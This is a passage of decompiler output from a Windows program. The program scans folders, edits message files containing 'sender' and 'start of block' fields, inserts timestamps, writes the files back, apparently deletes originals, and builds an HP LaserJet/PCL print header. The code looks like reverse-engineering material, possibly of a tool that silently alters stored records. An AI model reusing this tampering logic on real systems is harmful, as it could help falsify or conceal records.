  char v101; // [esp+6Dh] [ebp-543h]
  char v102; // [esp+6Eh] [ebp-542h]
  char v103; // [esp+6Fh] [ebp-541h]
  char v104; // [esp+70h] [ebp-540h]
  char v105; // [esp+71h] [ebp-53Fh]
  char v106; // [esp+72h] [ebp-53Eh]
  char v107; // [esp+73h] [ebp-53Dh]
  char v108; // [esp+74h] [ebp-53Ch]
  char v109; // [esp+75h] [ebp-53Bh]
  char v110; // [esp+76h] [ebp-53Ah]
  char v111; // [esp+77h] [ebp-539h]
  char v112; // [esp+78h] [ebp-538h]
  char v113; // [esp+79h] [ebp-537h]
  char v114; // [esp+7Ah] [ebp-536h]
  char v115; // [esp+7Bh] [ebp-535h]
  char v116; // [esp+7Ch] [ebp-534h]
  char v117; // [esp+7Dh] [ebp-533h]
  char v118; // [esp+7Eh] [ebp-532h]
  char v119; // [esp+7Fh] [ebp-531h]
  char v120; // [esp+80h] [ebp-530h]
  char v121; // [esp+81h] [ebp-52Fh]
  char v122; // [esp+82h] [ebp-52Eh]
  char v123; // [esp+83h] [ebp-52Dh]
  char v124; // [esp+84h] [ebp-52Ch]
  char v125; // [esp+85h] [ebp-52Bh]
  char v126; // [esp+86h] [ebp-52Ah]
  char v127; // [esp+87h] [ebp-529h]
  char v128; // [esp+88h] [ebp-528h]
  char v129; // [esp+89h] [ebp-527h]
  char v130; // [esp+8Ah] [ebp-526h]
  char v131; // [esp+8Bh] [ebp-525h]
  char v132; // [esp+8Ch] [ebp-524h]
  char v133; // [esp+8Dh] [ebp-523h]
  char v134; // [esp+8Eh] [ebp-522h]
  char v135; // [esp+8Fh] [ebp-521h]
  char v136; // [esp+90h] [ebp-520h]
  char v137; // [esp+91h] [ebp-51Fh]
  char v138; // [esp+92h] [ebp-51Eh]
  char v139; // [esp+93h] [ebp-51Dh]
  char v140; // [esp+94h] [ebp-51Ch]
  char v141; // [esp+95h] [ebp-51Bh]
  char v142; // [esp+96h] [ebp-51Ah]
  char v143; // [esp+97h] [ebp-519h]
  char v144; // [esp+98h] [ebp-518h]
  char v145; // [esp+99h] [ebp-517h]
  char v146; // [esp+9Ah] [ebp-516h]
  char v147; // [esp+9Bh] [ebp-515h]
  char v148; // [esp+9Ch] [ebp-514h]
  char v149; // [esp+9Dh] [ebp-513h]
  char v150; // [esp+9Eh] [ebp-512h]
  char v151; // [esp+9Fh] [ebp-511h]
  char v152; // [esp+A0h] [ebp-510h]
  char v153; // [esp+A1h] [ebp-50Fh]
  char v154; // [esp+A2h] [ebp-50Eh]
  char v155; // [esp+A3h] [ebp-50Dh]
  char v156; // [esp+A4h] [ebp-50Ch]
  char v157; // [esp+A5h] [ebp-50Bh]
  char v158; // [esp+A6h] [ebp-50Ah]
  char v159; // [esp+A7h] [ebp-509h]
  char v160; // [esp+A8h] [ebp-508h]
  char v161; // [esp+A9h] [ebp-507h]
  char v162; // [esp+AAh] [ebp-506h]
  CHAR FileName; // [esp+ACh] [ebp-504h]
  char v164; // [esp+ADh] [ebp-503h]
  __int16 v165; // [esp+1ADh] [ebp-403h]
  char v166; // [esp+1AFh] [ebp-401h]
  char Dest; // [esp+1B0h] [ebp-400h]
  char v168; // [esp+1B1h] [ebp-3FFh]
  __int16 v169; // [esp+5ADh] [ebp-3h]
  char v170; // [esp+5AFh] [ebp-1h]

  Dest = 0;
  memset(&v168, 0, 0x3FCu);
  v169 = 0;
  v170 = 0;
  v10 = 80;
  v21 = 52;
  v26 = 52;
  v30 = 80;
  v8 = 34;
  v9 = 72;
  v11 = 32;
  v12 = 76;
  v13 = 97;
  v14 = 115;
  v15 = 101;
  v16 = 114;
  v17 = 74;
  v18 = 101;
  v19 = 116;
  v20 = 32;
  v22 = 48;
  v23 = 48;
  v24 = 32;
  v25 = 77;
  v27 = 48;
  v28 = 49;
  v29 = 32;
  v31 = 67;
  v32 = 76;
  v33 = 32;
  v34 = 54;
  v35 = 64;
  v36 = 37;
  v37 = 64;
  v38 = 63;
  v39 = -1;
  v40 = -1;
  v41 = 1;
  v42 = 1;
  v43 = 1;
  v44 = 1;
  v45 = 1;
  v46 = 1;
  v47 = 1;
  v48 = 1;
  v49 = 1;
  v50 = 1;
  v51 = 1;
  v52 = 1;
  v53 = 63;
  v54 = 1;
  v55 = 1;
  v56 = 1;
  v57 = 1;
  v58 = 1;
  v59 = 1;
  v60 = 3;
  v61 = 2;
  v62 = 1;
  v63 = 81;
  v64 = 117;
  v65 = 79;
  v66 = 116;
  v67 = 69;
  v68 = 86;
  v69 = 101;
  v70 = 114;
  v71 = 100;
  v75 = 1;
  v76 = 1;
  v77 = 1;
  v78 = 1;
  v79 = 1;
  v80 = 1;
  v81 = 1;
  v82 = 1;
  v83 = 1;
  v84 = 1;
  v85 = 1;
  v86 = 1;
  v87 = 1;
  v88 = 1;
  v89 = 1;
  v90 = 1;
  v91 = 1;
  v92 = 1;
  v93 = 1;
  v94 = 1;
  v95 = 1;
  v96 = 1;
  v97 = 1;
  v98 = 1;
  v99 = 1;
  v102 = 1;
  v72 = 97;
  v73 = 110;
  v74 = 97;
  v100 = 63;
  v101 = 63;
  v103 = -1;
  v104 = -1;
  v105 = -1;
  v106 = 31;
  v107 = 64;
  v108 = 37;
  v109 = 64;
  v110 = 76;
  v111 = 101;
  v112 = 116;
  v113 = 116;
  v114 = 101;
  v115 = 114;
  v116 = 34;
  v117 = 32;
  v118 = 48;
  v119 = 32;
  v120 = 45;
  v121 = 49;
  v122 = 32;
  v123 = 49;
  v124 = 32;
  v125 = 49;
  v126 = 32;
  v127 = 49;
  v128 = 53;
  v129 = 32;
  v130 = 49;
  v131 = 54;
  v132 = 54;
  v133 = 32;
  v134 = 49;
  v135 = 54;
  v136 = 54;
  v137 = 32;
  v138 = 49;
  v139 = 54;
  v140 = 54;
  v141 = 32;
  v142 = 49;
  v143 = 54;
  v144 = 54;
  v145 = 32;
  v146 = 34;
  v147 = 86;
  v148 = 101;
  v149 = 114;
  v150 = 100;
  v151 = 97;
  v152 = 110;
  v153 = 97;
  v154 = 34;
  v155 = 32;
  v156 = 45;
  v157 = 53;
  v158 = 54;
  v159 = 32;
  v160 = 48;
  v161 = 32;
  v162 = 38;
  sub_4014F0(lpString);
  if ( lpString )
  {
    v2 = a1;
    v7 = lpString;
    v6 = a1;
    v5 = aSSS21;
  }
  else
  {
    v2 = a1;
    v7 = &v8;
    v6 = a1;
    v5 = aSSS;
  }
  sprintf(&Dest, v5, byte_41949C, v6, v7);
  v3 = sub_401C30(&Dest);
  FileName = 0;
  memset(&v164, 0, 0x100u);
  v165 = 0;
  v166 = 0;
  sprintf(&FileName, aSBak, v2);
  sub_401640(&FileName);
  return v3;
}

//----- (00403800) --------------------------------------------------------
signed int __cdecl sub_403800(int a1, int a2, int a3, int a4)
{
  unsigned int v4; // kr08_4
  int v5; // edx
  int v6; // ecx
  char *v7; // eax
  int v8; // ST1C_4
  int v9; // esi
  unsigned int v10; // ebp
  unsigned int v11; // kr0C_4
  unsigned int v12; // ecx
  char *v13; // esi
  unsigned int v14; // kr10_4
  unsigned int v15; // edx
  char *v16; // edi
  char *v17; // edi
  char *v18; // esi
  char v19; // cl
  unsigned int v20; // kr14_4
  char *v21; // edi
  unsigned int v22; // ecx
  unsigned int v23; // kr18_4
  char *v24; // edi
  char *v25; // eax
  char *v26; // edx
  char *v27; // eax
  char *v28; // eax
  char *v29; // eax
  int v30; // eax
  int v31; // ebp
  unsigned int v32; // kr20_4
  unsigned int v33; // ecx
  char *v34; // esi
  unsigned int v35; // kr24_4
  unsigned int v36; // edi
  int v37; // ebp
  char *v38; // esi
  signed int result; // eax
  char v40; // al
  char v41; // al
  int v42; // [esp-4h] [ebp-A8h]
  int v43; // [esp+10h] [ebp-94h]
  char *Str; // [esp+14h] [ebp-90h]
  unsigned int v45; // [esp+18h] [ebp-8Ch]
  char v46; // [esp+23h] [ebp-81h]
  struct _SYSTEMTIME SystemTime; // [esp+24h] [ebp-80h]
  int v48; // [esp+34h] [ebp-70h]
  char Dest; // [esp+38h] [ebp-6Ch]
  char v50; // [esp+39h] [ebp-6Bh]
  __int16 v51; // [esp+55h] [ebp-4Fh]
  char v52; // [esp+57h] [ebp-4Dh]
  char v53[4]; // [esp+58h] [ebp-4Ch]
  __int16 v54; // [esp+5Ch] [ebp-48h]
  __int16 v55; // [esp+75h] [ebp-2Fh]
  char v56; // [esp+77h] [ebp-2Dh]
  char v57[4]; // [esp+78h] [ebp-2Ch]
  __int16 v58; // [esp+95h] [ebp-Fh]
  char v59; // [esp+97h] [ebp-Dh]
  int v60; // [esp+A0h] [ebp-4h]

  LOBYTE(v43) = v46;
  std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(&v43, 0);
  v4 = strlen((const char *)&unk_41104C) + 1;
  v60 = 0;
  v48 = 0;
  if ( (unsigned __int8)std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Grow(a2, v4 - 1, 1) )
  {
    v5 = v4 - 1;
    qmemcpy(*(void **)(a2 + 4), &unk_41104C, v4 - 1);
    v42 = v4 - 1;
    v6 = a2;
LABEL_3:
    std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Eos(v6, v5, v42);
    goto LABEL_4;
  }
  while ( 1 )
  {
LABEL_4:
    v7 = *(char **)(a1 + 4);
    if ( !v7 )
      v7 = (char *)`std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Nullstr'::`2'::_C;
    v8 = v48;
    v9 = v48++ + 1;
    if ( sub_401E90(v7, (int)&v43, v8) )
      break;
    switch ( v9 )
    {
      case 4:
        if ( a3 )
        {
          v14 = strlen(asc_40F6AC) + 1;
          v10 = v14 - 1;
          if ( (unsigned __int8)std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Grow(
                                  &v43,
                                  v14 - 1,
                                  1) )
          {
            v16 = Str;
            qmemcpy(Str, asc_40F6AC, 4 * (v10 >> 2));
            v18 = &asc_40F6AC[4 * (v10 >> 2)];
            v17 = &v16[4 * (v10 >> 2)];
            v19 = v14 - 1;
            goto LABEL_18;
          }
        }
        else
        {
          v11 = strlen(asc_40F6B0) + 1;
          v10 = v11 - 1;
          if ( (unsigned __int8)std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Grow(
                                  &v43,
                                  v11 - 1,
                                  1) )
          {
            v12 = v11 - 1;
            v13 = asc_40F6B0;
            goto LABEL_17;
          }
        }
        break;
      case 5:
        if ( a3 )
        {
          v23 = strlen(aRedefinitionOf) + 1;
          v10 = v23 - 1;
          if ( !(unsigned __int8)std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Grow(
                                   &v43,
                                   v23 - 1,
                                   1) )
            break;
          v24 = Str;
          qmemcpy(Str, aRedefinitionOf, 4 * (v10 >> 2));
          v18 = &aRedefinitionOf[4 * (v10 >> 2)];
          v17 = &v24[4 * (v10 >> 2)];
          v19 = v23 - 1;
          goto LABEL_18;
        }
        v20 = strlen(aDefinitionOfTh) + 1;
        v10 = v20 - 1;
        if ( (unsigned __int8)std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Grow(
                                &v43,
                                v20 - 1,
                                1) )
        {
          v12 = v20 - 1;
          v13 = aDefinitionOfTh;
LABEL_17:
          v21 = Str;
          v15 = v12;
          v22 = v12 >> 2;
          qmemcpy(Str, v13, 4 * v22);
          v18 = &v13[4 * v22];
          v17 = &v21[4 * v22];
          v19 = v15;
LABEL_18:
          qmemcpy(v17, v18, v19 & 3);
          std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Eos(&v43, v15, v10);
          break;
        }
        break;
      case 7:
        *(_DWORD *)&SystemTime.wMonth = 0;
        *(_DWORD *)&SystemTime.wDay = 0;
        SystemTime.wYear = 0;
        *(_DWORD *)&SystemTime.wMinute = 0;
        SystemTime.wMilliseconds = 0;
        GetLocalTime(&SystemTime);
        Dest = 0;
        memset(&v50, 0, 0x1Cu);
        v51 = 0;
        v52 = 0;
        v57[0] = 0;
        memset(&v57[1], 0, 0x1Cu);
        v58 = 0;
        v59 = 0;
        v53[0] = 0;
        memset(&v53[1], 0, 0x1Cu);
        v55 = 0;
        v56 = 0;
        sprintf(
          &Dest,
          a02d02d02d02d02,
          SystemTime.wDay,
          SystemTime.wMonth,
          SystemTime.wYear % 100,
          SystemTime.wHour,
          SystemTime.wMinute,
          SystemTime.wSecond);
        sprintf(v57, a04d, a4);
        sprintf(v53, a06d, a3 + 1);
        v25 = Str;
        if ( !Str )
          v25 = (char *)`std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Nullstr'::`2'::_C;
        v26 = strchr(v25, 39);
        if ( !v26
          || (qmemcpy(v26 + 1, &Dest, strlen(&Dest)), (v27 = strchr(v26 + 10, 45)) == 0)
          || (v28 = v27 + 1, *(_DWORD *)v28 = *(_DWORD *)v57, (v29 = strchr(v28, 45)) == 0) )
        {
          v60 = -1;
          std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(&v43, 1);
          return -1;
        }
        v30 = (int)(v29 + 1);
        *(_DWORD *)v30 = *(_DWORD *)v53;
        *(_WORD *)(v30 + 4) = v54;
        break;
      case 10:
        if ( a3 )
        {
          v35 = strlen(aBpEveryNextMes) + 1;
          v31 = v35 - 1;
          if ( (unsigned __int8)std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Grow(
                                  &v43,
                                  v35 - 1,
                                  1) )
          {
            v33 = v35 - 1;
            v34 = aBpEveryNextMes;
            goto LABEL_34;
          }
        }
        else
        {
          v32 = strlen(aWh0PhTrapAtLin) + 1;
          v31 = v32 - 1;
          if ( (unsigned __int8)std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Grow(
                                  &v43,
                                  v32 - 1,
                                  1) )
          {
            v33 = v32 - 1;
            v34 = aWh0PhTrapAtLin;
LABEL_34:
            qmemcpy(Str, v34, v33);
            v45 = v31;
            Str[v31] = 0;
            break;
          }
        }
        break;
    }
    v36 = std::basic_string<char,std::char_traits<char>,std::allocator<char>>::npos;
    if ( v45 < std::basic_string<char,std::char_traits<char>,std::allocator<char>>::npos )
      v36 = v45;
    if ( std::basic_string<char,std::char_traits<char>,std::allocator<char>>::npos - *(_DWORD *)(a2 + 8) <= v36 )
      std::_Xlen();
    if ( v36 > 0 )
    {
      v37 = v36 + *(_DWORD *)(a2 + 8);
      if ( (unsigned __int8)std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Grow(
                              a2,
                              v36 + *(_DWORD *)(a2 + 8),
                              0) )
      {
        v38 = Str;
        if ( !Str )
          v38 = (char *)`std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Nullstr'::`2'::_C;
        v42 = v37;
        v5 = v36;
        qmemcpy((void *)(*(_DWORD *)(a2 + 8) + *(_DWORD *)(a2 + 4)), v38, v36);
        v6 = a2;
        goto LABEL_3;
      }
    }
  }
  if ( v9 >= 8 )
  {
    if ( Str )
    {
      v41 = *(Str - 1);
      if ( v41 && v41 != -1 )
        *(Str - 1) = v41 - 1;
      else
        sub_40BC56(Str - 1);
    }
    result = 0;
  }
  else
  {
    if ( Str )
    {
      v40 = *(Str - 1);
      if ( v40 && v40 != -1 )
      {
        *(Str - 1) = v40 - 1;
        return -1;
      }
      sub_40BC56(Str - 1);
    }
    result = -1;
  }
  return result;
}
// 40D124: using guessed type void __cdecl std::_Xlen();
// 40D128: using guessed type int __thiscall std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(_DWORD, _DWORD);
// 40D130: using guessed type int __fastcall std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Eos(_DWORD, _DWORD, _DWORD);
// 40D134: using guessed type int __thiscall std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Grow(_DWORD, _DWORD, _DWORD);

//----- (00403CD0) --------------------------------------------------------
int __cdecl sub_403CD0(LPCSTR lpFileName, int a2)
{
  CHAR *v2; // ebp
  int result; // eax
  int v4; // esi
  const CHAR *v5; // edi
  LPCVOID v6; // eax
  char v7; // al
  char v8; // al
  char v9; // al
  int v10; // [esp+8h] [ebp-34h]
  CHAR *v11; // [esp+Ch] [ebp-30h]
  char v12; // [esp+10h] [ebp-2Ch]
  LPCVOID lpBuffer; // [esp+14h] [ebp-28h]
  DWORD nNumberOfBytesToWrite; // [esp+18h] [ebp-24h]
  int v15; // [esp+1Ch] [ebp-20h]
  char v16; // [esp+20h] [ebp-1Ch]
  int v17; // [esp+24h] [ebp-18h]
  int v18; // [esp+38h] [ebp-4h]

  v10 = 0;
  v2 = (CHAR *)sub_401290(lpFileName, (int)&v10);
  v11 = v2;
  if ( !v2 )
    return -1;
  v16 = (char)lpFileName;
  std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(&v16, 0);
  v18 = 0;
  v4 = 0;
  v5 = (const CHAR *)sub_401CD0(v2, (int)&v16);
  if ( v5 )
  {
    do
    {
      v12 = (char)lpFileName;
      std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(&v12, 0);
      LOBYTE(v18) = 1;
      if ( sub_403800((int)&v16, (int)&v12, v4, a2) )
      {
        LOBYTE(v18) = 0;
        std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(&v12, 1);
      }
      else
      {
        v6 = lpBuffer;
        if ( !lpBuffer )
          v6 = (LPCVOID)`std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Nullstr'::`2'::_C;
        if ( !sub_401320(lpFileName, v6, nNumberOfBytesToWrite, v4 != 0) )
          ++v4;
        LOBYTE(v18) = 0;
        if ( lpBuffer )
        {
          v7 = *((char *)lpBuffer - 1);
          if ( v7 && v7 != -1 )
            *((char *)lpBuffer - 1) = v7 - 1;
          else
            sub_40BC56((char *)lpBuffer - 1);
        }
        lpBuffer = 0;
        nNumberOfBytesToWrite = 0;
        v15 = 0;
      }
      v5 = (const CHAR *)sub_401CD0(v5, (int)&v16);
    }
    while ( v5 );
    v2 = v11;
  }
  LocalFree(v2);
  if ( v4 )
  {
    if ( v17 )
    {
      v9 = *(_BYTE *)(v17 - 1);
      if ( v9 && v9 != -1 )
      {
        *(_BYTE *)(v17 - 1) = v9 - 1;
        return 0;
      }
      sub_40BC56((void *)(v17 - 1));
    }
    result = 0;
  }
  else
  {
    if ( v17 )
    {
      v8 = *(_BYTE *)(v17 - 1);
      if ( v8 && v8 != -1 )
      {
        *(_BYTE *)(v17 - 1) = v8 - 1;
        return -1;
      }
      sub_40BC56((void *)(v17 - 1));
    }
    result = -1;
  }
  return result;
}
// 40D128: using guessed type int __thiscall std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(_DWORD, _DWORD);

//----- (00403EB0) --------------------------------------------------------
int __cdecl sub_403EB0(char *Dir, char *Filename)
{
  int v2; // eax
  int v3; // ebp
  char Path; // [esp+10h] [ebp-410h]
  char v6; // [esp+11h] [ebp-40Fh]
  __int16 v7; // [esp+111h] [ebp-30Fh]
  char v8; // [esp+113h] [ebp-30Dh]
  char v9; // [esp+114h] [ebp-30Ch]
  char v10; // [esp+115h] [ebp-30Bh]
  __int16 v11; // [esp+215h] [ebp-20Bh]
  char v12; // [esp+217h] [ebp-209h]
  char v13; // [esp+218h] [ebp-208h]
  char v14; // [esp+219h] [ebp-207h]
  __int16 v15; // [esp+319h] [ebp-107h]
  char v16; // [esp+31Bh] [ebp-105h]
  CHAR String; // [esp+31Ch] [ebp-104h]
  char v18; // [esp+31Dh] [ebp-103h]
  __int16 v19; // [esp+41Dh] [ebp-3h]
  char v20; // [esp+41Fh] [ebp-1h]

  Path = 0;
  memset(&v6, 0, 0x100u);
  v7 = 0;
  v8 = 0;
  String = 0;
  memset(&v18, 0, 0x100u);
  v19 = 0;
  v20 = 0;
  v9 = 0;
  memset(&v10, 0, 0x100u);
  v11 = 0;
  v12 = 0;
  v13 = 0;
  memset(&v14, 0, 0x100u);
  v15 = 0;
  v16 = 0;
  makepath(&Path, 0, Dir, Filename, 0);
  strcpy(&v9, (const char *)&unk_41918C);
  strcat(&v9, &Dir[strlen(::Path)]);
  v2 = sub_403230(&v9);
  if ( v2 )
    v3 = v2 + 1;
  else
    v3 = sub_403150(Filename);
  strcpy(&v13, Filename);
  sub_4031D0((int)&v13, v3);
  makepath(&String, 0, &v9, &v13, 0);
  if ( sub_403CD0(&Path, v3) )
    return -1;
  sub_4033E0((int)&Path, &String);
  sub_401640(&Path);
  return 0;
}

//----- (00404070) --------------------------------------------------------
int __cdecl sub_404070(char *Dir)
{
  HANDLE v1; // edi
  struct _WIN32_FIND_DATAA FindFileData; // [esp+Ch] [ebp-244h]
  char Path; // [esp+14Ch] [ebp-104h]
  char v5; // [esp+14Dh] [ebp-103h]
  __int16 v6; // [esp+24Dh] [ebp-3h]
  char v7; // [esp+24Fh] [ebp-1h]

  Path = 0;
  memset(&v5, 0, 0x100u);
  v6 = 0;
  v7 = 0;
  makepath(&Path, 0, Dir, Ext, Ext);
  FindFileData.dwFileAttributes = 0;
  memset(&FindFileData.ftCreationTime, 0, 0x13Cu);
  v1 = FindFirstFileA(&Path, &FindFileData);
  if ( v1 == (HANDLE)-1 )
    return 0;
  do
  {
    if ( stricmp(FindFileData.cFileName, Str2) && stricmp(FindFileData.cFileName, asc_40F0DC) )
    {
      makepath(&Path, 0, Dir, FindFileData.cFileName, 0);
      if ( FindFileData.dwFileAttributes & 0x10 )
      {
        sub_404070(&Path);
      }
      else if ( PathMatchSpecA(FindFileData.cFileName, pszSpec) )
      {
        sub_403EB0(Dir, FindFileData.cFileName);
        sub_401640(&Path);
      }
    }
  }
  while ( FindNextFileA(v1, &FindFileData) );
  FindClose(v1);
  return 0;
}

//----- (004041B0) --------------------------------------------------------
int sub_4041B0()
{
  return sub_404070(Path);
}

//----- (004041C0) --------------------------------------------------------
int __cdecl sub_4041C0(LPCSTR lpFileName, int a2)
{
  int v2; // eax
  char Str; // [esp+4h] [ebp-104h]
  char v5; // [esp+5h] [ebp-103h]
  __int16 v6; // [esp+105h] [ebp-3h]
  char v7; // [esp+107h] [ebp-1h]

  v2 = dword_4195A0;
  if ( !dword_4195A0 )
  {
    v2 = a2;
    dword_4195A0 = a2;
    if ( !a2 )
    {
      Str = 0;
      memset(&v5, 0, 0x100u);
      v6 = 0;
      v7 = 0;
      strcpy(&Str, lpFileName);
      if ( strrchr(&Str, 92) )
        *strrchr(&Str, 92) = 0;
      v2 = sub_4032F0(&Str);
      dword_4195A0 = v2;
    }
  }
  if ( sub_403CD0(lpFileName, v2) )
    return -1;
  if ( !sub_4033E0((int)lpFileName, 0) )
    ++dword_4195A0;
  return 0;
}

//----- (004042A0) --------------------------------------------------------
int __cdecl sub_4042A0(char *Dir)
{
  int v2; // eax
  HANDLE hFindFile; // [esp+Ch] [ebp-248h]
  struct _WIN32_FIND_DATAA FindFileData; // [esp+10h] [ebp-244h]
  char Path; // [esp+150h] [ebp-104h]
  char v6; // [esp+151h] [ebp-103h]
  __int16 v7; // [esp+251h] [ebp-3h]
  char v8; // [esp+253h] [ebp-1h]

  Path = 0;
  memset(&v6, 0, 0x100u);
  v7 = 0;
  v8 = 0;
  makepath(&Path, 0, Dir, Ext, Ext);
  FindFileData.dwFileAttributes = 0;
  memset(&FindFileData.ftCreationTime, 0, 0x13Cu);
  hFindFile = FindFirstFileA(&Path, &FindFileData);
  if ( hFindFile == (HANDLE)-1 )
    return 0;
  do
  {
    if ( stricmp(FindFileData.cFileName, Str2)
      && stricmp(FindFileData.cFileName, asc_40F0DC)
      && !(FindFileData.dwFileAttributes & 0x10)
      && strlen(FindFileData.cFileName) == 4 )
    {
      makepath(&Path, 0, Dir, FindFileData.cFileName, 0);
      v2 = strtol(FindFileData.cFileName, 0, 10);
      sub_4041C0(&Path, v2);
      sub_401640(&Path);
    }
  }
  while ( FindNextFileA(hFindFile, &FindFileData) );
  FindClose(hFindFile);
  return 0;
}

//----- (004043E0) --------------------------------------------------------
int sub_4043E0()
{
  sub_4042A0(byte_410214);
  sub_4042A0(byte_410318);
  sub_4042A0(byte_41041C);
  return 0;
}

//----- (00404410) --------------------------------------------------------
signed int __cdecl sub_404410(char *Str, int a2)
{
  signed int v2; // edi
  const CHAR *v3; // eax
  int v4; // ST08_4
  char v5; // al
  LPCSTR v6; // edx
  unsigned int v7; // ebp
  int v8; // eax
  char v9; // al
  signed int result; // eax
  char v11; // [esp+13h] [ebp-9Dh]
  int v12; // [esp+14h] [ebp-9Ch]
  LPCSTR lpFirst; // [esp+18h] [ebp-98h]
  int v14; // [esp+1Ch] [ebp-94h]
  int v15; // [esp+20h] [ebp-90h]
  char Dest; // [esp+24h] [ebp-8Ch]
  char v17; // [esp+25h] [ebp-8Bh]
  char v18; // [esp+2Ah] [ebp-86h]
  __int16 v19; // [esp+A1h] [ebp-Fh]
  char v20; // [esp+A3h] [ebp-Dh]
  int v21; // [esp+ACh] [ebp-4h]

  LOBYTE(v12) = v11;
  lpFirst = 0;
  v14 = 0;
  v15 = 0;
  v21 = 0;
  v2 = 1;
  if ( sub_401E90(Str, (int)&v12, 0) )
  {
LABEL_6:
    if ( lpFirst )
    {
      v5 = *(lpFirst - 1);
      if ( v5 && v5 != -1 )
        *((_BYTE *)lpFirst - 1) = v5 - 1;
      else
        sub_40BC56((void *)(lpFirst - 1));
    }
    result = -1;
  }
  else
  {
    while ( 1 )
    {
      v3 = lpFirst;
      if ( !lpFirst )
        v3 = (const CHAR *)`std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Nullstr'::`2'::_C;
      if ( StrStrIA(v3, aSender) )
        break;
      v4 = v2++;
      if ( sub_401E90(Str, (int)&v12, v4) )
        goto LABEL_6;
    }
    Dest = 0;
    memset(&v17, 0, 0x7Cu);
    v6 = lpFirst;
    v19 = 0;
    v20 = 0;
    if ( !lpFirst )
      v6 = (LPCSTR)`std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Nullstr'::`2'::_C;
    strncpy(&Dest, &v6[strlen(aSender)], 0x7Fu);
    StrTrimA(&Dest, asc_40F6C8);
    v18 = 0;
    v7 = strlen(&Dest);
    if ( (unsigned __int8)std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Grow(a2, v7, 1) )
    {
      qmemcpy(*(void **)(a2 + 4), &Dest, v7);
      v8 = *(_DWORD *)(a2 + 4);
      *(_DWORD *)(a2 + 8) = v7;
      *(_BYTE *)(v8 + v7) = 0;
    }
    if ( lpFirst )
    {
      v9 = *(lpFirst - 1);
      if ( v9 && v9 != -1 )
      {
        *((_BYTE *)lpFirst - 1) = v9 - 1;
        return 0;
      }
      sub_40BC56((void *)(lpFirst - 1));
    }
    result = 0;
  }
  return result;
}
// 40D134: using guessed type int __thiscall std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Grow(_DWORD, _DWORD, _DWORD);

//----- (004045C0) --------------------------------------------------------
int __cdecl sub_4045C0(char *Str, int a2)
{
  int v2; // ebp
  unsigned int v3; // ebx
  int v4; // eax
  const CHAR *v5; // eax
  LPCSTR v6; // ecx
  char v7; // al
  _BYTE *v8; // eax
  unsigned int v9; // edi
  int v10; // ebx
  LPCSTR v11; // esi
  int v12; // eax
  int v13; // eax
  unsigned int v14; // ebx
  int v15; // ecx
  char v16; // al
  char v18; // [esp+13h] [ebp-21h]
  signed int v19; // [esp+14h] [ebp-20h]
  int v20; // [esp+18h] [ebp-1Ch]
  LPCSTR lpFirst; // [esp+1Ch] [ebp-18h]
  unsigned int v22; // [esp+20h] [ebp-14h]
  int v23; // [esp+30h] [ebp-4h]
  int v24; // [esp+3Ch] [ebp+8h]

  v18 = 0;
  LOBYTE(v20) = (_BYTE)Str;
  std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(&v20, 0);
  v2 = a2;
  v3 = strlen((const char *)&unk_41104C);
  v23 = 0;
  v19 = 0;
  if ( (unsigned __int8)std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Grow(a2, v3, 1) )
  {
    qmemcpy(*(void **)(a2 + 4), &unk_41104C, v3);
    v4 = *(_DWORD *)(a2 + 4);
    *(_DWORD *)(a2 + 8) = v3;
    *(_BYTE *)(v4 + v3) = 0;
  }
  v24 = 1;
  if ( !sub_401E90(Str, (int)&v20, 0) )
  {
    do
    {
      v5 = lpFirst;
      if ( !lpFirst )
        v5 = (const CHAR *)`std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Nullstr'::`2'::_C;
      if ( StrStrIA(v5, a16rStartOfBloc) )
      {
        v19 = 1;
      }
      else if ( !v19 )
      {
        goto LABEL_27;
      }
      v6 = lpFirst;
      if ( lpFirst )
      {
        v7 = *(lpFirst - 1);
        if ( v7 && v7 != -1 )
        {
          std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Grow(&v20, v22, 0);
          v6 = lpFirst;
        }
        if ( v6 )
        {
          *((_BYTE *)v6 - 1) = -1;
          v6 = lpFirst;
        }
        v8 = v6;
      }
      else
      {
        v8 = (_BYTE *)`std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Nullstr'::`2'::_C;
      }
      if ( *v8 == 46 )
      {
        v18 = 1;
        goto LABEL_31;
      }
      v9 = std::basic_string<char,std::char_traits<char>,std::allocator<char>>::npos;
      if ( v22 < std::basic_string<char,std::char_traits<char>,std::allocator<char>>::npos )
        v9 = v22;
      if ( std::basic_string<char,std::char_traits<char>,std::allocator<char>>::npos - *(_DWORD *)(v2 + 8) <= v9 )
        std::_Xlen();
      if ( v9 )
      {
        v10 = v9 + *(_DWORD *)(v2 + 8);
        if ( (unsigned __int8)std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Grow(
                                v2,
                                v9 + *(_DWORD *)(v2 + 8),
                                0) )
        {
          v11 = lpFirst;
          if ( !lpFirst )
